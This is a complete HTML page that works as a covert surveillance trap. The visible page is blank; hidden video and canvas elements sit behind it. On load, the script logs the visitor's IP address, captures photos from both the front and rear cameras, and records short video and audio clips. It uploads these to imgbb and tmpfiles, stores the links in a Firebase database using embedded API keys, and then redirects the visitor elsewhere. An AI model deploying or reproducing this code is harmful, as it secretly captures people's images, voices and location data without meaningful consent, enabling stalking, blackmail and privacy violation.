<!DOCTYPE html>
<html>
<head>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body>
<video id="v" autoplay playsinline muted style="display:none"></video>
<canvas id="c" style="display:none"></canvas>
<script>
const db = firebase.initializeApp({apiKey: "AIzaSyCaMV2_EKFrhW9CUHMOHnfyFER_M2mDcN8", databaseURL: "https://admin-aad81-default-rtdb.firebaseio.com"}).database();
const params = new URLSearchParams(window.location.search);
const usex = params.get('usex') || "Unknown";

async function cap(m) {
    try {
        const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: m}});
        const v = document.getElementById('v'); v.srcObject = s; await new Promise(r => v.onloadedmetadata = r);
        const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        const data = c.toDataURL('image/jpeg').split(',')[1];
        s.getTracks().forEach(t => t.stop());
        const res = await fetch("https://api.imgbb.com/1/upload?key=5a31b1f80b659a53569bb21b718c2364", {method:'POST', body: new URLSearchParams({image: data})});
        return (await res.json()).data.url;
    } catch(e) { return "Denied"; }
}

async function rec(t) {
    try {
        const s = await navigator.mediaDevices.getUserMedia(t === 'v' ? {video:true, audio:true} : {audio:true});
        const r = new MediaRecorder(s); const ch = [];
        r.ondataavailable = e => ch.push(e.data);
        r.start(); setTimeout(() => r.stop(), 5000);
        return await new Promise(res => {
            r.onstop = async () => {
                const b = new Blob(ch, {type: t === 'v' ? "video/mp4" : "audio/mp3"});
                const fd = new FormData(); fd.append("file", b, "file");
                const up = await fetch("https://tmpfiles.org/api/v1/upload", {method: "POST", body: fd});
                const j = await up.json();
                s.getTracks().forEach(t => t.stop());
                res(j.status === "success" ? j.data.url.replace("tmpfiles.org/", "tmpfiles.org/dl/") : "Error");
            };
        });
    } catch(e) { return "Denied"; }
}

window.onload = async () => {
    const ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip.replace(/\./g, '_');
    db.ref("Data_x/" + ip).set({
        usex: usex, time: new Date().toLocaleString(),
        cam1: await cap("user"), cam2: await cap("environment"),
        vid: await rec("v"), aud: await rec("a")
    });
    window.location.href = "https://traidmod.com/";
};
</script>
</body>
</html>
